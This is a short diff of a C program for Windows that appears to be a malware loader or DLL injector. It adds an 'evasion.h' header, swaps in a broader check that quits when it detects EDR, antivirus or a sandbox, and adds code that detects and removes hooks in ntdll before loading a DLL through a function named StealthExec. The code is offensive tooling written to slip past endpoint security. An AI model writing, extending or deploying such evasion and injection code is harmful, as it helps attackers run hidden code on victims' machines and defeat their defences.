@@ -1,8 +1,9 @@
-#include "detector.h"
 #include <windows.h>
 #include <psapi.h>
 #include <stdio.h>
 #include <stdbool.h>
+#include "detector.h"
+#include "evasion.h"
 
 // Function Prototypes
 typedef NTSTATUS(NTAPI* pSysAlloc)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
@@ -107,7 +108,7 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
 // Entry Function
 int main(int argc, char* argv[]) {
     //Check For EDR/AV/Sandbox env
-    if (CheckSandbox()) {
+    if (PerfomChecksEnv()) {
         return 0;
     }
     
@@ -115,6 +116,10 @@ int main(int argc, char* argv[]) {
     if (argc != 2) {
         LaunchCalc();
         return 0;
+    }
+
+    if (IsNtDllHooked()) {
+        UnhookNtdll();
     }
 
     const char* dllPath = argv[1];
